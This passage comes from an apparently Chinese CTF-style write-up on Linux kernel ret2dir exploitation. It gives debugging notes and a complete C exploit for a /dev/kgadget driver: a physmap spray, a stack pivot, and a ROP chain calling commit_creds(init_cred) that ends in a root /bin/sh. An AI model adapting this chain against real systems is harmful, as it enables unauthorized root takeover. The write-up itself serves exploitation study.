class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">generateROP</span><span class="params">(<span class="type">size_t</span> *rop)</span>&#123;</span><br><span class="line">    uint idx = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// add rsp, val</span></span><br><span class="line">    rop[idx++] = ADD_RSP_0XA8_POP_RBX_POP_R12_POP_RBP_RET; <span class="comment">// add rsp, 0xc0; ret;</span></span><br><span class="line">    idx += <span class="number">0xc0</span><span class="number">-0x10</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;=<span class="number">0x20</span>; ++i)rop[idx++] = RET; <span class="comment">// ret;</span></span><br><span class="line">    <span class="comment">// common ROP chain</span></span><br><span class="line">	<span class="comment">//=========================================================</span></span><br><span class="line">    <span class="comment">// pop rdi; ret;</span></span><br><span class="line">    <span class="comment">// 0</span></span><br><span class="line">    <span class="comment">// prepare_kernel_cred</span></span><br><span class="line">    <span class="comment">// mov rdi, rax; pop rbx; mov rax, rdi; pop rbp; ret;</span></span><br><span class="line">    <span class="comment">// 0</span></span><br><span class="line">    <span class="comment">// 0</span></span><br><span class="line">    <span class="comment">// commit_creds</span></span><br><span class="line">    <span class="comment">// swapgs_restore_regs_and_return_to_usermode</span></span><br><span class="line">    <span class="comment">// 0 // padding</span></span><br><span class="line">    <span class="comment">// 0 // padding</span></span><br><span class="line">    <span class="comment">// shell_addr</span></span><br><span class="line">    <span class="comment">// user_cs</span></span><br><span class="line">    <span class="comment">// user_rflags</span></span><br><span class="line">    <span class="comment">// user_sp</span></span><br><span class="line">    <span class="comment">// user_ss</span></span><br><span class="line">	<span class="comment">//=========================================================</span></span><br><span class="line">    rop[idx++] = POP_RDI_RET;</span><br><span class="line">    rop[idx++] = <span class="number">0</span>;</span><br><span class="line">    rop[idx++] = PREPARE_KERNEL_CRED;</span><br><span class="line">    <span class="comment">// 替换 mov rdi, rax; pop rbx; mov rax, rdi; pop rbp; ret;</span></span><br><span class="line">    rop[idx++] = PUSH_RAX_RET;  </span><br><span class="line">    rop[idx++] = POP_RDI_RET;</span><br><span class="line">    rop[idx++] = COMMIT_CREDS;</span><br><span class="line">    rop[idx++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE;</span><br><span class="line">    rop[idx++] = <span class="number">0</span>;</span><br><span class="line">    rop[idx++] = <span class="number">0</span>;</span><br><span class="line">    rop[idx++] = (<span class="type">uint64_t</span>)get_root_shell;</span><br><span class="line">    rop[idx++] = user_cs;</span><br><span class="line">    rop[idx++] = user_rflags;</span><br><span class="line">    rop[idx++] = user_sp;</span><br><span class="line">    rop[idx++] = user_ss;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="完整exp与执行"><a href="#完整exp与执行" class="headerlink" title="完整exp与执行"></a>完整exp与执行</h3><ol>
+<li>正确通过<code>(*rdx)()</code>执行线性映射区上的<code>add rsp, val; ret</code>的<code>gadget</code></li>
+</ol>
+<img lazyload src="/images/loading.svg" data-src="/2026/03/18/Linux-Kernel-PWN%EF%BC%88%E4%BA%94%EF%BC%89ret2dir/image-20260318233009368.png" class title="image-20260318233009368">
+
+<ol start="2">
+<li>执行<code>pop rsp; ret</code>进行栈迁移</li>
+</ol>
+<img lazyload src="/images/loading.svg" data-src="/2026/03/18/Linux-Kernel-PWN%EF%BC%88%E4%BA%94%EF%BC%89ret2dir/image-20260318233032585.png" class title="image-20260318233032585">
+
+<img lazyload src="/images/loading.svg" data-src="/2026/03/18/Linux-Kernel-PWN%EF%BC%88%E4%BA%94%EF%BC%89ret2dir/image-20260318233107418.png" class title="image-20260318233107418">
+
+<ol start="3">
+<li>进入<code>ROP</code>链，先到<code>ret</code>滑板上，然后进入提权<code>rop</code></li>
+</ol>
+<img lazyload src="/images/loading.svg" data-src="/2026/03/18/Linux-Kernel-PWN%EF%BC%88%E4%BA%94%EF%BC%89ret2dir/image-20260318233342836.png" class title="image-20260318233342836">
+
+<img lazyload src="/images/loading.svg" data-src="/2026/03/18/Linux-Kernel-PWN%EF%BC%88%E4%BA%94%EF%BC%89ret2dir/image-20260318233845575.png" class title="image-20260318233845575">
+
+<ol start="4">
+<li>在执行<code>prepare_kernel_cred</code>函数的时候：</li>
+</ol>
+<img lazyload src="/images/loading.svg" data-src="/2026/03/18/Linux-Kernel-PWN%EF%BC%88%E4%BA%94%EF%BC%89ret2dir/image-20260318234724604.png" class title="image-20260318234724604">
+
+<p>这里将通过<code>commit_cred(prepare_kernel_cred(0))</code>的方式改为<code>commit_cred(init_cred)</code>。但是发生segment fault且提权失败</p>
+<img lazyload src="/images/loading.svg" data-src="/2026/03/18/Linux-Kernel-PWN%EF%BC%88%E4%BA%94%EF%BC%89ret2dir/image-20260319074354947.png" class title="image-20260319074354947">
+
+<ol start="5">
+<li>怀疑是栈不平衡，遂<code>rop[idx++] = user_sp + 0x8</code>尝试，成功提权</li>
+</ol>
+<img lazyload src="/images/loading.svg" data-src="/2026/03/18/Linux-Kernel-PWN%EF%BC%88%E4%BA%94%EF%BC%89ret2dir/image-20260319074150056.png" class title="image-20260319074150056">
+
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>      <span class="comment">// printf(), puts()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span>     <span class="comment">// uint8_t, uint64_t</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span>  <span class="comment">// ioctl()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span>      <span class="comment">// open()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span>     <span class="comment">// exit()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>     <span class="comment">// write()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span>     <span class="comment">// strcmp()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span>   <span class="comment">// mmap()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span> <span class="comment">// sysconf()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ===================== 基础颜色格式宏（统一管理）=====================</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_NONE     <span class="string">&quot;\033[0m&quot;</span>    <span class="comment">// 清除所有格式</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_HIGHLIGHT <span class="string">&quot;\033[1m&quot;</span>   <span class="comment">// 高亮（加粗）</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BG_BLACK       <span class="string">&quot;\033[40m&quot;</span>   <span class="comment">// 背景色：黑色</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 前景色（文字色）- 基础定义</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FG_RED         <span class="string">&quot;\033[31m&quot;</span>   <span class="comment">// 红色</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FG_BLUE        <span class="string">&quot;\033[34m&quot;</span>   <span class="comment">// 蓝色</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FG_GREEN       <span class="string">&quot;\033[32m&quot;</span>   <span class="comment">// 绿色</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FG_YELLOW      <span class="string">&quot;\033[33m&quot;</span>   <span class="comment">// 黄色</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 组合格式（高亮 + 前景色 + 黑色背景）</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RED     COLOR_HIGHLIGHT FG_RED BG_BLACK</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLUE    COLOR_HIGHLIGHT FG_BLUE BG_BLACK</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN   COLOR_HIGHLIGHT FG_GREEN BG_BLACK</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> YELLOW  COLOR_HIGHLIGHT FG_YELLOW BG_BLACK</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ===================== 日志格式宏（基于上面的颜色宏）=====================</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SUCCESS_MSG(msg)    GREEN <span class="string">&quot;[+] &quot;</span> msg COLOR_NONE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INFO_MSG(msg)       BLUE <span class="string">&quot;[*] &quot;</span> msg COLOR_NONE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ERROR_MSG(msg)      RED <span class="string">&quot;[-] &quot;</span> msg COLOR_NONE</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ===================== 日志打印函数宏 ======================</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_success(msg)        puts(SUCCESS_MSG(msg))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_success_fmt(fmt, ...)  printf(SUCCESS_MSG(fmt) <span class="string">&quot;\n&quot;</span>, ##__VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_info(msg)           puts(INFO_MSG(msg))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_info_fmt(fmt, ...)  printf(INFO_MSG(fmt) <span class="string">&quot;\n&quot;</span>, ##__VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_error(msg)          puts(ERROR_MSG(msg))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_error_fmt(fmt, ...)  printf(ERROR_MSG(fmt) <span class="string">&quot;\n&quot;</span>, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//-----------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="type">uint64_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_state</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pushf;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">	<span class="built_in">printf</span>(RED<span class="string">&quot;[*]save state\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(BLUE<span class="string">&quot;[+]user_ss:0x%lx\n&quot;</span>, user_ss);</span><br><span class="line">	<span class="built_in">printf</span>(BLUE<span class="string">&quot;[+]user_cs:0x%lx\n&quot;</span>, user_cs);</span><br><span class="line">	<span class="built_in">printf</span>(BLUE<span class="string">&quot;[+]user_cs:0x%lx\n&quot;</span>, user_sp);</span><br><span class="line">	<span class="built_in">printf</span>(BLUE<span class="string">&quot;[+]user_rflags:0x%lx\n&quot;</span>, user_rflags);</span><br><span class="line">	<span class="built_in">printf</span>(RED<span class="string">&quot;[*]save finish\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//-----------------------------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE  0xffffffff81c00fb0UL</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET                                 0xffffffff8108c6f0UL</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED                         0xffffffff810c9540UL</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUSH_RAX_RET                                0xffffffff810048eaUL</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS                                0xffffffff810c92e0UL</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADD_RSP_0XA8_POP_RBX_POP_R12_POP_RBP_RET    0xffffffff81488561UL</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RET											0xffffffff810001fcUL</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RSP_RET									0xffffffff811483d0UL  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INIT_CRED                                   0xffffffff82a6b700UL</span></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">size_t</span> pagesize;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 核心函数：虚拟地址 → 物理地址转换</span></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">get_physical_address</span><span class="params">(<span class="type">int</span> pid, <span class="type">uint64_t</span> virtual_addr)</span> &#123;</span><br><span class="line">    <span class="type">char</span> pagemap_path[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">snprintf</span>(pagemap_path, <span class="keyword">sizeof</span>(pagemap_path), <span class="string">&quot;/proc/%d/pagemap&quot;</span>, pid);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打开pagemap文件（必须root权限）</span></span><br><span class="line">    <span class="type">int</span> pagemap_fd = open(pagemap_path, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (pagemap_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[-] 打开pagemap失败: %s（需root权限）\n&quot;</span>, strerror(errno));</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">uint64_t</span>)<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算pagemap偏移（每个页占8字节）</span></span><br><span class="line">    <span class="type">off_t</span> offset = (virtual_addr / pagesize) * <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span> (lseek(pagemap_fd, offset, SEEK_SET) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[-] lseek失败: %s\n&quot;</span>, strerror(errno));</span><br><span class="line">        close(pagemap_fd);</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">uint64_t</span>)<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取8字节pagemap项（二进制数据）</span></span><br><span class="line">    <span class="type">uint64_t</span> pagemap_entry;</span><br><span class="line">    <span class="type">ssize_t</span> bytes_read = read(pagemap_fd, &amp;pagemap_entry, <span class="keyword">sizeof</span>(pagemap_entry));</span><br><span class="line">    close(pagemap_fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bytes_read != <span class="keyword">sizeof</span>(pagemap_entry)) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[-] 读取pagemap失败: %s\n&quot;</span>, strerror(errno));</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">uint64_t</span>)<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// bit63=1表示有物理映射，否则无</span></span><br><span class="line">    <span class="keyword">if</span> (!(pagemap_entry &amp; (<span class="number">1ULL</span> &lt;&lt; <span class="number">63</span>))) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[-] 虚拟地址0x%lx无物理映射\n&quot;</span>, virtual_addr);</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">uint64_t</span>)<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 提取物理页框号（PFN），计算物理地址</span></span><br><span class="line">    <span class="type">uint64_t</span> pfn = pagemap_entry &amp; <span class="number">0x7FFFFFFFFFFFFFU</span>LL;</span><br><span class="line">    <span class="keyword">return</span> pfn * pagesize;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root_shell</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid() != <span class="number">0</span>)&#123;</span><br><span class="line">        log_error(<span class="string">&quot;not root&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">generateROP</span><span class="params">(<span class="type">size_t</span> *rop)</span>&#123;</span><br><span class="line">    uint idx = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// add rsp, val</span></span><br><span class="line">    rop[idx++] = ADD_RSP_0XA8_POP_RBX_POP_R12_POP_RBP_RET; <span class="comment">// add rsp, 0xc0; ret;</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;=<span class="number">0x20</span>; ++i)rop[idx++] = RET; <span class="comment">// ret;</span></span><br><span class="line">    <span class="comment">// common ROP chain</span></span><br><span class="line">	<span class="comment">//=========================================================</span></span><br><span class="line">    <span class="comment">// pop rdi; ret;</span></span><br><span class="line">    <span class="comment">// 0</span></span><br><span class="line">    <span class="comment">// prepare_kernel_cred</span></span><br><span class="line">    <span class="comment">// mov rdi, rax; pop rbx; mov rax, rdi; pop rbp; ret;</span></span><br><span class="line">    <span class="comment">// 0</span></span><br><span class="line">    <span class="comment">// 0</span></span><br><span class="line">    <span class="comment">// commit_creds</span></span><br><span class="line">    <span class="comment">// swapgs_restore_regs_and_return_to_usermode</span></span><br><span class="line">    <span class="comment">// 0 // padding</span></span><br><span class="line">    <span class="comment">// 0 // padding</span></span><br><span class="line">    <span class="comment">// shell_addr</span></span><br><span class="line">    <span class="comment">// user_cs</span></span><br><span class="line">    <span class="comment">// user_rflags</span></span><br><span class="line">    <span class="comment">// user_sp</span></span><br><span class="line">    <span class="comment">// user_ss</span></span><br><span class="line">	<span class="comment">//=========================================================</span></span><br><span class="line">    rop[idx++] = POP_RDI_RET;</span><br><span class="line">    <span class="comment">// rop[idx++] = 0;</span></span><br><span class="line">    rop[idx++] = INIT_CRED;</span><br><span class="line">    <span class="comment">// rop[idx++] = PREPARE_KERNEL_CRED;</span></span><br><span class="line">    <span class="comment">// // 替换 mov rdi, rax; pop rbx; mov rax, rdi; pop rbp; ret;</span></span><br><span class="line">    <span class="comment">// rop[idx++] = PUSH_RAX_RET;  </span></span><br><span class="line">    <span class="comment">// rop[idx++] = POP_RDI_RET;</span></span><br><span class="line">    rop[idx++] = COMMIT_CREDS;</span><br><span class="line">    rop[idx++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">27</span>;</span><br><span class="line">    rop[idx++] = <span class="number">0</span>;</span><br><span class="line">    rop[idx++] = <span class="number">0</span>;</span><br><span class="line">    rop[idx++] = (<span class="type">uint64_t</span>)get_root_shell;</span><br><span class="line">    rop[idx++] = user_cs;</span><br><span class="line">    rop[idx++] = user_rflags;</span><br><span class="line">    rop[idx++] = user_sp + <span class="number">0x8</span>;  <span class="comment">// 最后发现有segment falut且提权失败，尝试+0x8平衡栈</span></span><br><span class="line">    rop[idx++] = user_ss;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">physmap_spray</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> pid = getpid(); <span class="comment">// 获取当前进程ID</span></span><br><span class="line">    pagesize = sysconf(_SC_PAGE_SIZE);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] 系统页大小: %ld 字节\n&quot;</span>, pagesize);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] 当前进程PID: %d\n&quot;</span>, pid);</span><br><span class="line">    <span class="type">size_t</span>* ROP_buffer = mmap(</span><br><span class="line">        <span class="literal">NULL</span>, </span><br><span class="line">        pagesize, </span><br><span class="line">        PROT_READ | PROT_WRITE, </span><br><span class="line">        MAP_ANONYMOUS | MAP_PRIVATE, </span><br><span class="line">        <span class="number">-1</span>, </span><br><span class="line">        <span class="number">0</span></span><br><span class="line">    );</span><br><span class="line">    generateROP(ROP_buffer);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> total = <span class="number">0x4000</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; total; i++)&#123;</span><br><span class="line">        <span class="type">size_t</span>* heap_buffer = mmap(</span><br><span class="line">            <span class="literal">NULL</span>, </span><br><span class="line">            pagesize, </span><br><span class="line">            PROT_READ | PROT_WRITE, </span><br><span class="line">            MAP_ANONYMOUS | MAP_PRIVATE, </span><br><span class="line">            <span class="number">-1</span>, </span><br><span class="line">            <span class="number">0</span></span><br><span class="line">        );</span><br><span class="line">        <span class="built_in">memcpy</span>(heap_buffer, ROP_buffer, pagesize);</span><br><span class="line">        <span class="comment">// // 打印物理地址（每1000个+最后一个打印）</span></span><br><span class="line">        <span class="comment">// if (i % 1000 == 0 || i == total - 1) &#123;</span></span><br><span class="line">        <span class="comment">//     uint64_t phys_addr = get_physical_address(pid, (uint64_t)heap_buffer);</span></span><br><span class="line">        <span class="comment">//     printf(&quot;[+] 第 %d 个heap_buffer → 虚拟地址: %p | 物理地址: 0x%lx\n&quot;,</span></span><br><span class="line">        <span class="comment">//            i, heap_buffer, phys_addr);</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> try_hit = <span class="number">0xffff888000000000</span> + <span class="number">0x8000000</span>;</span><br><span class="line"><span class="type">uint64_t</span>* pop_rsp_ret = (<span class="type">uint64_t</span>*)POP_RSP_RET;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    save_state();</span><br><span class="line">    physmap_spray();</span><br><span class="line">    <span class="comment">// pause();</span></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/kgadget&quot;</span>, O_RDWR);</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14,   0x11111111;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13,   0x22222222;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12,   0x33333333;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp,   0x44444444;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx,   0x55555555;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10,   0x77777777;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,    pop_rsp_ret;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,    try_hit;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rax,   0x10;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx,   try_hit;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi,   114514;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi,   fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
